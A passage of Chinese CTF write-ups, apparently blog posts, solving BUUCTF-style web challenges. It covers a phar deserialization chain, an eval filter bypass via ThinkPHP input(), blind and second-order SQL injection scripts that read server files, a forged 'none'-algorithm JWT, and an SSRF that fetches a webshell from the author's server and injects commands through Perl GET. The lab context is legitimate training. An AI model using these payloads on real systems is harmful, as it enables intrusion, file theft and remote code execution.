$this-&gt;test 要被 $this-&gt;str赋值，所以，这里，直接给 $this-&gt;str = new Show()。 上代码 注意：这里要生成phar文件，需要在 php.ini 中 让phar.readonly = On 为 Off，不然会报错 12345678910111213141516171819202122$c1e4r = new C1e4r();$show = new Show();$test = new Test();// 这里之所以要为params['source'] 是因为你Show的__toStringd调用source;// Test的 get方法会进行检测 $this-&gt;params[$key] 未定义 则赋值 index.php// 因为调用了一个未定义属性 source ,所以$key的值为 'source' // 所以这里的 $value = $this-&gt;params[$key]; 获取的就是 '/var/www/html/f1ag.php'$test-&gt;params['source'] = '/var/www/html/f1ag.php';$show-&gt;str['str'] = $test;$c1e4r-&gt;str = $show;# 创建对象 exp.phar 是文件名$phar = new Phar('exp.phar');$phar-&gt;startBuffering();// 设置stub$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');//$phar-&gt;setMetadata($c1e4r);// 要压缩的文件$phar-&gt;addFromString('exp.txt','test');$phar-&gt;stopBuffering(); 执行生成 phar后缀肯定上传不上去，改后缀上传 找到文件 phar://伪协议读取 1file.php?file=phar://upload/8db450d8192e8744a04cbdef20abcaf1.jpg 得到 这个就是flag，不解码了。 总结通过这道题，再一次巩固了反序列化的phar类型的题，不仅是phar类型，还有pop链的构造，我对pop链构造一直都不是很熟悉，说到底都还是这种类型的题做得太少，自己觉得这个题还是有难度，尤其是这么多个文件，还是去找执行反序列化的地方，刚开始，我一直以为是Test类file_get方法中的 file_get_contents函数，但是怎么想都不对，如果是它，那怎么利用呢，基本上不可能，看了别的师傅wp，才知道用phar://协议读取，file_exists函数也可以触发反序列化，学到了很多 。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【web】一道TimelineSec团队入队题]]></title>
    <url>%2F2021%2F08%2F22%2F%5Bweb%5D%E4%B8%80%E9%81%93TimelineSec%E5%9B%A2%E9%98%9F%E5%85%A5%E9%98%9F%E9%A2%98%2F</url>
    <content type="text"><![CDATA[考点源码泄露 代码审计 preg_match绕过 前置知识thinkphp助手函数助手函数 助手函数对常用的函数进行了封装，（可以理解别名，但不能完全这么理解）大概如下几种。 app url input redirect validate cookie env 这里主要讲 input。 input 有点类似与 $_GET $_POST 语法格式 1input(&apos;请求类型.]参数名[/变量修饰符]&apos;, &apos;默认值&apos;, &apos;过滤方法&apos;); 获取某个请求类型的所有请求参数 123456789// 获取get请求类型的所有参数及其参数值// 返回值：一维数组// 键名：参数名，键值：参数值$array = input(&apos;get.&apos;);// 获取post请求类型的所有参数及其参数值// 返回值：一维数组// 键名：参数名，键值：参数值$array = input(&apos;post.&apos;); 获取某个请求参数的值 12// 获取任何请求类型的name参数值$name = input(&apos;name&apos;); 变量修饰符 12// 获取指定参数的值并将转为数字$id = input(&apos;id/d&apos;); 参数默认值 123// 获取指定参数的值 没有获取到将返回默认值// 示例：如果id参数不存在，返回 666$id = input(&apos;id&apos;, 666); 过滤方法 12// 获取指定参数的值再经过intval函数进行过滤$id = input(&apos;id&apos;,&apos;&apos;, &apos;intval&apos;); 可用input 这个助手函数绕过正则对$_GET/$_POST等关键字过滤。 解题过程打开 报了403，紧接着扫扫目录。 发现源码泄露，down下来。 代码审计通过把代码放到Seay进行自动审计，得到结果。 其他都是thinkphp框架的环境，这里直接开始审计第一个。 路径：/app/controller/Index.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace app\controller;use app\BaseController;class Index extends BaseController&#123; public function index() &#123; $white_fun = array( 'print', ); if(isset($_GET['code']))&#123; $code = $_GET['code']; if(preg_match_all('/([\w]+)([\x00-\x1F\x7F\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(/i', $code, $matches1)) &#123; foreach ($matches1[1] as $value) &#123; echo $value.'&lt;/br&gt;'; if (function_exists($value) &amp;&amp; ! in_array($value, $white_fun)) &#123; echo '加把劲~'; exit; &#125; &#125; &#125; if(preg_match('/(new)|(dump)|(content)|(f)|(php)|(base)|(evala)|(assert)|(system)|(exec)|(passthru)|(code)|(chr)|(ord)|(include)|(require)|(request)|(import)|(post)|(get)|(cookie)|(sess)|(server)|(copy)|(hex)|(bin)|( )|(\")|(\/)|(\&gt;)|(\&lt;)|(~)|(\&#123;)|(\&#125;)|(\.)|(,)|(`)|(\$)|(_)|(\^)|(!)|(%)|(\+)|(\|)|(dl)|(open)|(mail)|(env)|(ini)|(link)|(url)|(http)|(html)|(conv)|(add)|(str)|(parse)/i', $code)) &#123; echo '收手吧阿祖'; exit; &#125;else&#123; //var_dump($code); eval($code); &#125; &#125;else&#123; return '就挺秃然的。'; &#125; &#125; public function hello($name = 'ThinkPHP6') &#123; return 'hello,' . $name; &#125;&#125; 这里的路由规则看不太懂，但是不影响做题，直接访问 /public/ 这个路径就能执行到上面代码 127.0.0.1:9999/public/ 分析要执行到eval($code)，需要经过两个条件 第一个 123456789if(preg_match_all('/([\w]+)([\x00-\x1F\x7F\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(/i', $code, $matches1)) &#123; foreach ($matches1[1] as $value) &#123; echo $value.'&lt;/br&gt;'; if (function_exists($value) &amp;&amp; ! in_array($value, $white_fun)) &#123; echo '加把劲~'; exit; &#125; &#125;&#125; 分析： 正则会匹配$_GET[‘code’] 接收的值，然后会通过函数 function_exists()判断 ，如果给定的函数已经被定义就返回true，当接收的值是一个被定义的函数名并且这个函数名又不在$white_fun数组中，程序就会终止。但是我发现当我当在函数名两边加上单引号，就不会被匹配到，并且还能执行，比如assert(); 这样会被匹配到，变成 ‘assert’()就不会，通过在本地测试，’assert’()能够执行。 第二个 1234567if(preg_match('/(new)|(dump)|(content)|(f)|(php)|(base)|(evala)|(assert)|(system)|(exec)|(passthru)|(code)|(chr)|(ord)|(include)|(require)|(request)|(import)|(post)|(get)|(cookie)|(sess)|(server)|(copy)|(hex)|(bin)|( )|(\")|(\/)|(\&gt;)|(\&lt;)|(~)|(\&#123;)|(\&#125;)|(\.)|(,)|(`)|(\$)|(_)|(\^)|(!)|(%)|(\+)|(\|)|(dl)|(open)|(mail)|(env)|(ini)|(link)|(url)|(http)|(html)|(conv)|(add)|(str)|(parse)/i', $code)) &#123; echo '收手吧阿祖'; exit; &#125;else&#123; //var_dump($code); eval($code); &#125; 即便是绕过了第一个正则，很多函数还能被ban了，自己尝试了8进制编码绕过，但是由于过滤了双引号，不能执行成功，php编码函数绕过，大部分都被过滤，找到一个bzdecompress，但是需要开启bz2，默认是不开启，放弃了，还有就是通过数组，数组可以绕过过以上两个条件，但是最终值为 Array，显然达不到我想要的效果，最终问了出题师傅，提示了thinkphp的助手函数。助手函数，找到一个 input的助手函数，功能类似于 $_GET[&#39;name&#39;] ，前者比后者强大，前者所有方式传参都能接收，比如 $name = input(&#39;name&#39;);,GET、POST等都能传进来。 构造payload在构造payload的时候，我思路太狭窄了。 当时构造的是 123456?code=&apos;input&apos;(&apos;name&apos;);&amp;name=eval(&quot;phpinfo();&quot;);?code=&apos;input&apos;(&apos;name&apos;);&amp;name=eval(&quot;phpinfo()&quot;);?code=&apos;input&apos;(&apos;name&apos;);&amp;name=@eval(base64_decode($_GET[z0]));&amp;z0=cGhwaW5mbygpOw==?code=&apos;input&apos;(&apos;name&apos;);&amp;name=@eval(base64_decode($_GET[z0]));&amp;z0=InBocGluZm8oKTsi?code=&apos;input&apos;(&apos;name&apos;);&amp;name=assert(&quot;phpinfo();&quot;);?code=&apos;input&apos;(&apos;name&apos;);&amp;name=`phpinfo();` 发现没有回显，后来经过大师傅指点，这样传进去根本只是个字符串 12?code=&apos;input&apos;(&apos;name&apos;);&amp;name=eval(&quot;phpinfo();&quot;);我以为上边会执行 eval(&quot;phpinfo();&quot;); 但其实只是个字符串，感觉确实有点绕，只需要记住，eval只能执行当前传入的字符串一次。eval(&apos;input&apos;(&apos;name&apos;);) 等价于 input(&apos;name&apos;) 最后实在想不出来什么招，就问了出题师傅payload。 1/public/?code=((%27input%27)(%27aun%27))((%27input%27)(%27cmd%27));&amp;aun=system&amp;cmd=whoami 看到这个payload，我大吃一惊，我咋就没想到。 于是自己也构造了一个payload 1?code=&apos;input&apos;(&apos;cmd&apos;)(&apos;input&apos;(&apos;value&apos;));&amp;cmd=system&amp;value=whoami 也可以执行。 拿 flag 的payload 1?code=&apos;input&apos;(&apos;cmd&apos;)(&apos;input&apos;(&apos;value&apos;));&amp;cmd=system&amp;value=/readflag 总结我太菜了。]]></content>
      <categories>
        <category>CTF WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码审计</tag>
        <tag>preg_match绕过</tag>
        <tag>源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【GYCTF2020】Ezsqli 1]]></title>
    <url>%2F2021%2F08%2F21%2F%5BGYCTF2020%5DEzsqli%201%2F</url>
    <content type="text"><![CDATA[考点sql盲注（无列名注入） 前置知识过滤information_schema 代替表以下表都可代替information_schema表查询表名信息，但是不能查到列名 12mysql.innodb_table_statstable_schema table_schema 换成 database_name 123sys.x$schema_table_statistics（只能查表名，查不到列名）表名：table_name 数据库：table_schema 123sys.schema_auto_increment_columns（可获取表名和库名）表名：table_name 数据库：table_schema 123sys.schema_table_statistics_with_buffer（可获取表名）表名：table_name 数据库：table_schema 无列名注入（只知道表名的情况下查询数据）子查询绕过 12(select `2` from (select 1,2,3 union select * from table_name)a) //前提是要知道表名((select c from (select 1,2,3 as c union select * from users)b)) 1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量 join爆破列名 12?id=-1&apos; union all select * from (select * from users as a join users as b)as c--+//as主要作用是起别名，就是把users表当做a表，常规来说as可以省略?id=-1&apos; union all select*from (select * from users as a join users as b using(id,username))as c--+ 逐字符检索数据 这里的select 1 是对应字段的位置 比如 id username password 1 就对应id 2就对应 username 3就对应 password 123456789101112mysql&gt; select (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 0 |+------------------------------------------------------------+mysql&gt; select (select 1,&apos;d&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 1 |+------------------------------------------------------------+//说明第二个字段的第一位是c,以此类推 12345mysql&gt; select (select 1,&apos;cm&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 0 |+------------------------------------------------------------+ 解题过程打开页面 页面上一个半身照，一个提交的输入框，POST提交方式，bp启动。 检测注入类型12?id=1^1^1 //回显Nu1L?id=1^0^1 //Error Occured When Fetch Result. 检测出异或盲注 FUZZ检测关键字过滤 length为507 是被过滤的 挑几个关键的 1information handler join information 已经被过滤，只有通过 sys的x$schema_table_statistics 来查询表名。 构造payload查表名payload 11^(ascii(substr((select group_concat(table_name)from sys.x$schema_table_statistics where table_schema=database()),1,1))&gt;0)^1 上脚本 12345678910111213141516171819202122232425import requestsurl='http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'flag=''for i in range(1,50): a = 32 b = 128 mid = (a+b)//2 while(a&lt;b): data = &#123; "id": "1^(ascii(substr((select group_concat(table_name)from sys.x$schema_table_statistics where table_schema=database()),%d,1))&gt;%d)^1"%(i, mid) &#125; import time time.sleep(1) re = requests.post(url=url,data=data) if 'Nu1L' in re.text: a = mid + 1 b = mid mid = (a+b)//2 if (mid==32|mid==128): break flag +=chr(mid) print(flag) 跑起来 得到 1users233333333333333,f1ag_1s_h3r3_hhhhh information_schema关键字已经被过滤掉，想通过columns表来查询列名，几乎不可能，通过逐字符检索数据的方法来逐个猜解值，也就是无列名注入 猜解值构造payload（两个都可以） 121^((select (select 1,&apos;g&apos;)&gt;(select * from f1ag_1s_h3r3_hhhhh)))^1-1||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 上大佬的脚本，遇到问题还挺多，buuctf网站限制访问频率，直接跑，不一会就会报错，每次请求延时1秒。 123456789101112131415161718import requestsurl='http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'payload='-1||((select 1,"&#123;&#125;")&gt;(select * from f1ag_1s_h3r3_hhhhh))'flag=''for j in range(1,50): for i in range(32,128): hexchar=flag+chr(i) py=payload.format(hexchar) print(py) datas=&#123;'id':py&#125; import time time.sleep(1) re=requests.post(url=url,data=datas) if 'Nu1L' in re.text: flag+=chr(i-1) print(flag) break 跑起来 结果 1FLAG&#123;AE26CBD7-C851-4928-98E4-E0635D45B90C&#125; py一下转小写 123&gt;&gt;&gt; s = &quot;FLAG&#123;AE26CBD7-C851-4928-98E4-E0635D45B90C&#125;&quot;&gt;&gt;&gt; print(s.lower())flag&#123;ae26cbd7-c851-4928-98e4-e0635d45b90c&#125; 总结]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【HFCTF2020】EasyLogin 1]]></title>
    <url>%2F2021%2F08%2F21%2F%5BHFCTF2020%5DEasyLogin%201%2F</url>
    <content type="text"><![CDATA[考点代码审计（node.js） JWT伪造 前置知识node.js node.js koa框架常用目录，文件 app/controllers 项目控制器存放目录：接收请求，处理逻辑 app/dbhelper 数据库CRUD操作的封装 app/models 对应数据库表表结构 config/router.js 项目路由 node_modules app.js 项目入口 JWTJWT 小知识JWS：Signed JWT签名过的jwtJWE：Encrypted JWT部分payload经过加密的jwt JWT的组成三个部分（用点分割）header：主要声明JWT的签名算法payload：主要承载了各种声明并传递明文数据signture：拥有该部分的JWT被称为JWS，也就是签了名的JWS；没有该部分的JWT被称为nonsecure JWT，也就是不安全的JWT，此时header中声明的签名算法为none。 JWT的形式： 123eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ JWT的相关攻击方式 解题过程审查元素引入一个 app.js文件 找到一些关键字 koa ,koa是一个基于node.js的web框架。 可以直接通过目录 controllers/api.js 访问到后端源代码，拷贝过来审计。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = &#123; # 注册功能 'POST /api/register': async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; # 这里判断 如果注册的用户名 为 admin 则不继续执行 返回 wrong username if(!username || username === 'admin')&#123; throw new APIError('register error', 'wrong username'); &#125; # 这里是 什么 大于 10w 重新赋值 if(global.secrets.length &gt; 100000) &#123; global.secrets = []; &#125; # 后边 应该是该加密 加密 该编码编码 该保存保存 const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) # 返回一个token 内容就是JWT const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: 'HS256'&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, # 登录功能 'POST /api/login': async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; # 判断是否提交用户名和密码 没有则停止 if(!username || !password) &#123; throw new APIError('login error', 'username or password is necessary'); &#125; # 下面两句不知道 const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) # sid不能为 undefined sid 不能为 null sid&gt;=0&amp;&amp;sid&lt; global.secrets.length if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError('login error', 'no such secret id'); &#125; const secret = global.secrets[sid]; const user = jwt.verify(token, secret, &#123;algorithm: 'HS256'&#125;); const status = username === user.username &amp;&amp; password === user.password; if(status) &#123; ctx.session.username = username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, # 获取flag功能 'GET /api/flag': async (ctx, next) =&gt; &#123; # 要求 session中的username 必须为 admin if(ctx.session.username !== 'admin')&#123; throw new APIError('permission error', 'permission denied'); &#125; const flag = fs.readFileSync('/flag').toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, 'GET /api/logout': async (ctx, next) =&gt; &#123; ctx.session.username = null; ctx.rest(&#123; status: true &#125;) await next(); &#125;&#125;; node.js真的一点基础都没有，不过有语言基础，还是能勉强看得懂一些，跟着大佬的wp再来审计一遍。 解题方式需要构造一个JWT解码后明文为下面这样的JWT，将加密方式改成none，secretid改成[]，接下来需要将明文转换成JWT格式。 12345678910&#123; &quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;&#123; &quot;secretid&quot;: [], &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;iat&quot;: 1629515715&#125; 解题首先注册一个账号 然后登录这个账号的时候抓包 后边跟了一个名为anthorization的参数，将参数值拿到 这个平台 jwt解码 查看明文。 我们要做的就是将 HEADER 中的 alg加密方式改成 none，然后先将 PAYLOAD中的 secretid 改成[]，再将username改成admin，但是这里的HEADER是不能直接修改，就直接给出替换内容 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 ，然后手动将PAYLOAD中的secretid改成 []，加密后再将 SIGNATURE部分山刀，. 不删。就像下面这样。 然后将这段密文替换到anthorization 参数中，最后很重要的一个地方，也很容易忘，就是将username改成admin。 1eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTYyOTUxODYwMn0. 提交 可见返回true 获取flag 小结这道题对node.js 和 JWT 都是一窍不通，都是硬着头皮照着大佬wp做了下来，其实之前做过jwt伪造类的题目，但是对JWT的原理并不懂，所以很快就忘掉了，这次算是巩固了一次吧，总之经验需要不断积累，原理需要深入理解。每天两道CTF题，时间就打发了。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>JWT伪造</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【网鼎杯 2018】Comment 1]]></title>
    <url>%2F2021%2F08%2F17%2F%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment%201%2F</url>
    <content type="text"><![CDATA[考点密码爆破 git泄露 代码审计 二次注入 解题过程打开 一个留言板页面 一个登录页面 自己手工试了下，不存在万能密码绕过。仔细看了下输入框，发现有关键字，直接bp启动，开始爆破zhangwei*** 后三位。 构造3位纯数字作为payload 得到密码 zhangwei666 接下来登录 有个发帖和留言功能，用sqlmap也没检测出注入点。 接下来用dirsearch扫下目录。 1python3 dirsearch.py -u &quot;http://ccd2d540-8775-4d4a-a19c-70165c4879f1.node4.buuoj.cn:81/&quot; -x 404,429 -s 1 存在.git泄露 使用GitHacker对git文件进行恢复（ubuntu下） 1githacker --url http://ccd2d540-8775-4d4a-a19c-70165c4879f1.node4.buuoj.cn:81/.git --folder res --threads 1 得到一个write_do.php 的文件 进目录中查找更改历史 1git log --reflog 只显示这一个，看了别的师傅wp，这里会出来3个历史更改，然后用 git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c 命令，就可以得到完整的代码。 可能是工具或者环境的问题，这里直接给代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phpinclude "mysql.php";session_start();# if($_SESSION['login'] != 'yes')&#123; header("Location: ./login.php"); die();&#125;if(isset($_GET['do']))&#123; switch ($_GET['do']) &#123; case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); # 将 category title content 插入 board 表中 $sql = "insert into board set category = '$category', title = '$title', content = '$content'"; # 执行sql $result = mysql_query($sql); header("Location: ./index.php"); break; case 'comment': $bo_id = addslashes($_POST['bo_id']); # 根据 bo_id 查询 category 字段值 $sql = "select category from board where id='$bo_id'"; # 执行sql $result = mysql_query($sql); $num = mysql_num_rows($result); # 大于0 代表有结果集 if($num&gt;0)&#123; # 获取 category 字段值 $category = mysql_fetch_array($result)['category']; # 获取提交内容 $content = addslashes($_POST['content']); # 将 category 和 content 、bo_id 放入数据库中 # sql语句中的 $category 变量是从数据库中取出，而 $category 的值 最开始由 # $_POST['category'] # 经过 addslashes 对 单双引号 反斜线 进行转义（给' 转义成 \',\",\\）， 但是到数据库中 这些\ # 会被丢弃，所以，这里存在二次注入 $sql = "insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'"; $result = mysql_query($sql); &#125; header("Location: ./comment.php?id=$bo_id"); break; default: header("Location: ./index.php"); &#125;&#125;else&#123; header("Location: ./index.php");&#125;?&gt; 代码审计这段代码有两个主要的作用，第一个分支write，是将帖子的标题、内容、分类插入到数据库中，第二个分支comment，提交留言，不过，这里在提交留言的时候，会先根据 bo_id 在数据库中进行查询，然后取出分类字段的字段值，然后再将取出的分类字段值和提交的留言以及bo_id插入到 comment 表中。虽说经过了 addslashes 进行转义，但是数据库中并不会存储 \ ，所以在第二次取出category，再次进行拼接插入的时候，就照成了注入，也是二次注入。 12345678$category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); # 将 category title content 插入 board 表中 $sql = "insert into board set category = '$category', title = '$title', content = '$content'"; 这里并不存在注入。 1234567891011# 这里的$category 是从数据中获取# addslashes($_POST['category']); 拿到 ' " / 会转义成 \' \" \\ # 但是这样的 \' 存储在数据库中 \会被丢弃$category = mysql_fetch_array($result)['category']; # 获取提交内容 $content = addslashes($_POST['content']); $sql = "insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'"; 二次注入构造payload aa&#39;,content=database(),/* 先在index.php POST 1title=111&amp;category=aa&apos;,content=database(),/*&amp;content=111 1title=111&amp;category=aa%27%2Ccontent%3Ddatabase%28%29%2C%2F*&amp;content=111 插入的数据 12insert into board set category = 'aa',content=database(),/*', title = '111',content = '111'; 然后在comment.php POST 1content=*/#&amp;bo_id=2 1content=*%2F%23&amp;bo_id=2 插入的数据 1insert into comment set category ='aa',content=database(),/*', content = '*/#',bo_id = '2'; 真正在数据库中执行的语句为 1insert into comment set category = &apos;aa&apos;,content=database(), 回显 数据库名 先用下面payload尝试读取/etc/passwd index.php 1title=111&amp;category=aa&apos;,content=(select load_file(&apos;/etc/passwd&apos;)),/*&amp;content=111 comment.php 1content=*/#&amp;bo_id=2 回显 按照别的师傅wp指示 读取 /home/www/.bash_histroy 构造payload index.php 1title=111&amp;category=aa&apos;,content=(select load_file(&apos;/home/www/.bash_history&apos;)),/*&amp;content=111 再次读取 .DS_store 1title=111&amp;category=aa&apos;,content=(select load_file(&apos;/tmp/html/.DS_Store&apos;)),/*&amp;content=111 用hex函数继续读取 1title=111&amp;category=aa&apos;,content=(select hex(load_file(&apos;/tmp/html/.DS_Store&apos;))),/*&amp;content=111 解码 可以从字符串中看到一个带有flag字样的文件名，这个文件名不在/home/www中，在/var/www/html中， 接下来继续读取 1title=111&amp;category=aa&apos;,content=(select hex(load_file(&apos;/var/www/html/flag_8946e1ff1ee3e40f.php&apos;))),/*&amp;content=111 得到，解码，拿到flag。 总结这道题两个考点，又学到了新知识，第一个是git源码泄露，原本一直用的是githack，但是这个工具只能下载文件，不能查看历史版本，通过大佬的wp，又了解到一个githacker的工具，中途花了不少时间去安装这个工具，还是踩了些坑，这个工具要比githack强大些。第二个知识就是二次注入，二次注入做了很多次，每次花样都不一样，不看wp肯定做不起，不过又了解到了一种姿势，就此记录下来，原理都是一样。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>密码爆破</tag>
        <tag>二次注入</tag>
        <tag>代码审计</tag>
        <tag>文件泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【HITCON 2017】SSRFme 1]]></title>
    <url>%2F2021%2F08%2F16%2F%5BHITCON%202017%5DSSRFme%201%2F</url>
    <content type="text"><![CDATA[考点 ssrf 代码审计 解题过程打开1234567891011121314151617181936.18.121.204 &lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; &#125; echo $_SERVER["REMOTE_ADDR"]; $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec("GET " . escapeshellarg($_GET["url"])); $info = pathinfo($_GET["filename"]); $dir = str_replace(".", "", basename($info["dirname"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info["basename"]), $data); highlight_file(__FILE__); 得到一份源代码，那肯定是先进行代码审计 代码审计123456789101112131415161718192021222324252627282930313233&lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; # explode 使用一个字符串分割另一个字符串 $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; &#125; echo $_SERVER["REMOTE_ADDR"]; # $sandbox 的值为 sanbox/(orange36.18.121.204 md5加密后的值) $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); # 以$sandbox的值创建路径 @mkdir($sandbox); # 进入路径 @chdir($sandbox); # shell_exec 执行命令 # escapeshellarg 把字符串转码为可以在 shell 命令里使用的参数 # $data = shell_exec("GET " . escapeshellarg($_GET["url"])); # 返回文件路径的信息 文件名可以通过GET["filename"]传参 $info = pathinfo($_GET["filename"]); # basename($info["dirname"]) # basename 返回路径中的文件名部分 # $info["dirname"] 返回路径中的目录部分 # 将 xxx 字符串中的 . 替换成 '' $dir = str_replace(".", "", basename($info["dirname"])); # 创建文件夹 @mkdir($dir); # 进入文件夹 @chdir($dir); # 写入文件 # 将$data 写入 basename($info["basename"] 文件中 @file_put_contents(basename($info["basename"]), $data); highlight_file(__FILE__); 这道代码的作用：通过sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;])创建了一个沙盒目录，然后$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));执行GET命令，参数由外部$_GET[&quot;url&quot;]传参，外部$info = pathinfo($_GET[&quot;filename&quot;]);传入文件名，将GET命令执行结果写入文件中file_put_contents(basename($info[&quot;basename&quot;]), $data);。 分析完后首先想到的就是，在vps上绑定一句话木马进行监听，然后通过GET命令去请求，用$_GET[“filename”]传入的值作为文件名保存。 在服务器上写上一句话目标，然后保存。 用python启动一个http服务 1python3 -m http.server 构造pyalod进行请求 1?url=121.4.xx.xx:8000/shell.php&amp;filename=shell.php 接下来需要去沙盒路径下访问刚刚写入的文件 shell.php 1234路径的构造规则 sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;])在页面中回显的ip 36.18.121.204 通过 md5 加密 orange36.18.121.204 得到 d23635209b921a91099a3d5b85be6af2拼接 sandbox/d23635209b921a91099a3d5b85be6af2 访问 sandbox/d23635209b921a91099a3d5b85be6af2/shell.php POST 提交 phpinfo() 蚁剑启动 根目录下看到flag，双击打不开 切换到终端，执行./readflag ，成功拿到flag 第二种方式利用GET命令的一个漏洞，GET命令是用perl来执行，而prel的open可以执行命令，这里都是看别人wp才知道的，说得都是云里雾里，直接进行演示。 用GET 执行命令 （先创建文件才执行GET才能成功） 12touch &apos;ls|&apos;GET &quot;file:ls|&quot; 123456789101112131415┌──(kali㉿kali)-[/tmp]└─$ touch &apos;ls|&apos; ┌──(kali㉿kali)-[/tmp]└─$ GET &quot;file:ls|&quot;fcitx-socket-:0ls|ssh-jMvsHCg3mID2systemd-private-344dd432807142dd8950d423318f82d0-colord.service-ysjeOfsystemd-private-344dd432807142dd8950d423318f82d0-haveged.service-k1bxPfsystemd-private-344dd432807142dd8950d423318f82d0-ModemManager.service-p6Qjyhsystemd-private-344dd432807142dd8950d423318f82d0-systemd-logind.service-IpdMMhsystemd-private-344dd432807142dd8950d423318f82d0-upower.service-re1qdfVMwareDnDvmware-root_437-1849036237 在kali中，要让命令执行生效，需要在 /usr/share/perl5/LWP/Protocol/file.pm 文件中，将 open(my $fh,&#39;&lt;&#39;, $path) or return new 修改为open(my $fh, $path) or return new。 构造payload拿flag 先执行两遍 1?url=file:bash -c /readflag|&amp;filename=bash -c /readfla 在访问 /sandbox/d23635209b921a91099a3d5b85be6af2/bash -c /readflag| 总结对这道题处于一种，啊，这就是ssrf题吗。平时ssrf做得很少，现在要是问我，什么是ssrf，我会回答，服务端请求伪造，但是要我说个案例，我就说不上来。这道题给我的提升就是知道GET命令的漏洞以及利用方式。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [RCTF2015]EasySQL 1]]></title>
    <url>%2F2021%2F08%2F16%2F%5BRCTF2015%5DEasySQL%201%2F</url>
